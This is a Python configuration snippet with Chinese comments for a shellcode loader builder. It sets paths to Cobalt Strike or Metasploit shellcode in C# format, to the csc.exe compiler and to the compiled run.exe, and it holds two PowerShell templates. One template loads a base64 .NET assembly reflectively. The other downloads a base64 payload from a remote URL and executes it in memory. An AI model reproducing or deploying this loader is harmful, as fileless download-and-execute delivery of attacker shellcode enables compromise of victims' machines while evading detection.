CSPATH=r"C:\Users\jiushi\Desktop\payload.cs" #cs或msf生成的shellcode cs格式的，记得把变量改为buf

CSCPATH=r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" #本机csc.exe所在路径
OUTPUTTMPCS="output/tmp.cs" #临时生成的模板
OUTTMPEXE="output/run.exe" #临时编译生成的exe

#powershellcommand
ps1command='''
#X86 Powershell Command:
$payload="雷电芽衣"
$tk=[Convert]::FromBase64String($payload)
[Reflection.Assembly]::Load($tk)
[run.Program]::box()
'''

ps2command='''
#X86 Powershell Command:
$payload=(New-Object Net.WebClient).DownloadString("http://url/base.txt")
$tk=[Convert]::FromBase64String($payload)
[Reflection.Assembly]::Load($tk)
[run.Program]::box()'''